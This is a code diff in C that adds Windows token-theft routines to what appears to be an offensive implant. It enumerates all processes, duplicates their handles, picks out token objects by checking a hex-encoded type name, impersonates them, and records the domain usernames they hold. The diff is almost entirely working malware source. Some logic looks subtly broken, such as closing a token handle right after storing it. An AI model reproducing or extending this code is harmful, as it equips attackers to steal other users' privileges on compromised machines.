@@ -377,3 +377,238 @@ VOID TokenImpersonate( BOOL Impersonate )
     else
         Instance.Win32.RevertToSelf();
 }
+
+LPWSTR GetObjectInfo( HANDLE hObject, OBJECT_INFORMATION_CLASS objInfoClass )
+{
+    LPWSTR                   data        = NULL;
+    DWORD                    dwSize      = sizeof(OBJECT_NAME_INFORMATION);
+    POBJECT_NAME_INFORMATION pObjectInfo = NULL;
+    NTSTATUS                 status      = STATUS_SUCCESS;
+
+    pObjectInfo = Instance.Win32.LocalAlloc( LPTR, dwSize );
+   
+    status = Instance.Syscall.NtQueryObject( hObject, objInfoClass, pObjectInfo, dwSize, &dwSize );
+
+    do
+    {
+        Instance.Win32.LocalFree( pObjectInfo );
+        pObjectInfo = Instance.Win32.LocalAlloc( LPTR, dwSize );
+        status = Instance.Syscall.NtQueryObject( hObject, objInfoClass, pObjectInfo, dwSize, &dwSize );
+    } while ( status == STATUS_INFO_LENGTH_MISMATCH );
+
+    if ( NT_SUCCESS (status) )
+    {
+        data = Instance.Win32.LocalAlloc( LPTR, pObjectInfo->Name.Length );
+        MemCopy( data, pObjectInfo->Name.Buffer, pObjectInfo->Name.Length );
+        Instance.Win32.LocalFree( pObjectInfo );
+        return data;
+    }
+
+    Instance.Win32.LocalFree( pObjectInfo );
+
+    return NULL;
+}
+
+BOOL IsImpersonationToken( HANDLE token )
+{
+    HANDLE temp_token                       = NULL;
+    BOOL   ret                              = FALSE;
+    LPVOID TokenImpersonationInfo[BUF_SIZE] = { 0 };
+    DWORD  returned_tokinfo_length          = 0;
+
+    if ( Instance.Win32.GetTokenInformation( token, TokenImpersonationLevel, TokenImpersonationInfo, BUF_SIZE, &returned_tokinfo_length ) )
+    {
+        if (*((SECURITY_IMPERSONATION_LEVEL*)TokenImpersonationInfo) >= SecurityImpersonation)
+            return TRUE;
+        else
+            return FALSE;
+    }
+
+    ret = Win32_DuplicateTokenEx( token, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &temp_token );
+    Instance.Win32.NtClose( temp_token );
+
+    return ret;
+}
+
+BOOL GetDomainUsernameFromToken(HANDLE token, PCHAR FullName)
+{
+    LPVOID TokenUserInfo[BUF_SIZE] = { 0 };
+    CHAR   username[BUF_SIZE]      = { 0 };
+    CHAR   domainname[BUF_SIZE]    = { 0 };
+    DWORD  user_length             = sizeof(username);
+    DWORD  domain_length           = sizeof(domainname);
+    DWORD  sid_type                = 0;
+    DWORD  returned_tokinfo_length = 0;
+
+    if ( ! Instance.Win32.GetTokenInformation( token, TokenUser, TokenUserInfo, BUF_SIZE, &returned_tokinfo_length ) )
+        return FALSE;
+
+    if ( ! Instance.Win32.LookupAccountSidA( NULL, ((TOKEN_USER*)TokenUserInfo)->User.Sid, username, &user_length, domainname, &domain_length, (PSID_NAME_USE)&sid_type ) )
+        return FALSE;
+
+    // Make full name in DOMAIN\USERNAME format
+    StringCopyA( FullName, domainname );
+    StringConcatA( FullName, "\\");
+    StringConcatA( FullName, username);
+
+    return TRUE;
+}
+
+BOOL ListTokens( PSavedToken* pTokenList, PDWORD pNumTokens )
+{
+    BOOL                        ReturnValue       = FALSE;
+    DWORD                       NumTokens         = 0;
+    DWORD                       ListSize          = BUF_SIZE;
+    PSavedToken                 TokenList         = NULL;
+    NTSTATUS                    status            = STATUS_SUCCESS;
+    PSYSTEM_PROCESS_INFORMATION pProcessInfoList  = NULL;
+    PSYSTEM_PROCESS_INFORMATION pProcessInfoEntry = NULL;
+    DWORD                       dwSize            = sizeof(SYSTEM_HANDLE_INFORMATION);
+    BOOL                        MoreProcesses     = TRUE;
+    HANDLE                      hProcess          = NULL;
+    HANDLE                      hObject           = NULL;
+    HANDLE                      hObject2          = NULL;
+    CLIENT_ID                   ProcID            = { 0 };
+    OBJECT_ATTRIBUTES           ObjAttr           = { sizeof( ObjAttr ) };
+    LPWSTR                      lpwsType          = NULL;
+
+    TokenList = Instance.Win32.LocalAlloc( LPTR, ListSize * sizeof( SavedToken ) );
+    if (!TokenList)
+        goto Cleanup;
+    
+    if ( ! TokenSetPrivilege( SE_IMPERSONATE_NAME, TRUE ) )
+        goto Cleanup;
+
+    pProcessInfoList = Instance.Win32.LocalAlloc( LPTR, dwSize );
+    if ( ! pProcessInfoList )
+        goto Cleanup;
+
+    
+    status = Instance.Syscall.NtQuerySystemInformation( SystemProcessInformation, pProcessInfoList, dwSize, &dwSize );
+
+    while (status == STATUS_INFO_LENGTH_MISMATCH)
+    {
+        Instance.Win32.LocalFree( pProcessInfoList );
+        pProcessInfoList = Instance.Win32.LocalAlloc( LPTR, dwSize );
+        if ( ! pProcessInfoList )
+            goto Cleanup;
+        status = Instance.Syscall.NtQuerySystemInformation(SystemProcessInformation, pProcessInfoList, dwSize, &dwSize);
+    }
+
+    if ( ! NT_SUCCESS( status ) )
+        goto Cleanup;
+
+    pProcessInfoEntry = pProcessInfoList;
+
+    while ( MoreProcesses )
+    {
+        if ( pProcessInfoEntry->NextEntryOffset == 0 )
+        {
+            MoreProcesses = FALSE;
+        }
+
+        ProcID.UniqueProcess = pProcessInfoEntry->UniqueProcessId;
+
+        status = Instance.Syscall.NtOpenProcess( &hProcess, MAXIMUM_ALLOWED, &ObjAttr, &ProcID );
+        if ( NT_SUCCESS( status ) )
+        {
+            for ( DWORD i = 0; i < pProcessInfoEntry->HandleCount; i++ )
+            {
+                hObject = NULL;
+
+                status = Instance.Syscall.NtDuplicateObject( hProcess, (HANDLE)((i + 1) * 4), NtCurrentProcess( ), &hObject, 0, 0, DUPLICATE_SAME_ACCESS );
+                if ( NT_SUCCESS( status ) )
+                {
+                    lpwsType = GetObjectInfo(hObject, ObjectTypeInformation);
+                    if ( lpwsType && lpwsType[0] == 0x54 && lpwsType[1] == 0x6f && lpwsType[2] == 0x6b && lpwsType[3] == 0x65 && lpwsType[4] == 0x6e && Instance.Win32.ImpersonateLoggedOnUser( hObject ) )
+                    {
+                        if ( Instance.Win32.OpenThreadToken( NtCurrentThread(), MAXIMUM_ALLOWED, TRUE, &hObject2 ) )
+                        {
+                            Instance.Win32.RevertToSelf();
+
+                            if ( IsImpersonationToken( hObject2 ) )
+                            {
+                                // Reallocate space if necessary
+                                if ( NumTokens >= ListSize )
+                                {
+                                    ListSize *= 2;
+                                    TokenList = Instance.Win32.LocalReAlloc(
+                                            TokenList,
+                                            ListSize * sizeof( SavedToken ),
+                                            LMEM_MOVEABLE
+                                    );
+                                    if ( ! TokenList )
+                                        goto Cleanup;
+                                }
+
+
+                                if ( GetDomainUsernameFromToken( hObject, TokenList[ NumTokens ].username ) )
+                                {
+                                    TokenList[ NumTokens ].token = hObject;
+                                    NumTokens++;
+                                }
+                            }
+                            Instance.Win32.NtClose( hObject2 ); hObject2 = NULL;
+                        }
+                    }
+                    if ( lpwsType )
+                        Instance.Win32.LocalFree( lpwsType );
+                    Instance.Win32.NtClose( hObject ); hObject = NULL;
+                }
+            }
+
+            status = Instance.Syscall.NtOpenProcessToken( hProcess, TOKEN_ALL_ACCESS, &hObject );
+            if ( NT_SUCCESS( status ) )
+            {
+                if ( Instance.Win32.ImpersonateLoggedOnUser( hObject ) )
+                {
+                    if ( Instance.Win32.OpenThreadToken( NtCurrentThread(), MAXIMUM_ALLOWED, TRUE, &hObject2 ) )
+                    {
+                        Instance.Win32.RevertToSelf();
+
+                        if ( IsImpersonationToken( hObject2 ) )
+                        {
+                            // Reallocate space if necessary
+                            if ( NumTokens >= ListSize )
+                            {
+                                ListSize *= 2;
+                                TokenList = Instance.Win32.LocalReAlloc(
+                                        TokenList,
+                                        ListSize * sizeof( SavedToken ),
+                                        LMEM_MOVEABLE
+                                );
+                                if ( ! TokenList )
+                                    goto Cleanup;
+                            }
+
+                            if ( GetDomainUsernameFromToken( hObject, TokenList[ NumTokens ].username ) )
+                            {
+                                TokenList[ NumTokens ].token = hObject;
+                                NumTokens++;
+                            }
+                        }
+
+                        Instance.Win32.NtClose( hObject2 ); hObject2 = NULL;
+                    }
+                }
+                Instance.Win32.NtClose( hObject ); hObject = NULL;
+            }
+
+            Instance.Win32.NtClose( hProcess ); hProcess = NULL;
+        }
+
+        pProcessInfoEntry = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)pProcessInfoEntry + (ULONG_PTR)pProcessInfoEntry->NextEntryOffset);
+    }
+
+    *pTokenList = TokenList;
+    *pNumTokens = NumTokens;
+    ReturnValue = TRUE;
+
+Cleanup:
+    if ( ! ReturnValue && TokenList )
+        Instance.Win32.LocalFree( TokenList );
+    if ( pProcessInfoList )
+        Instance.Win32.LocalFree( pProcessInfoList );
+
+    return ReturnValue;
+}
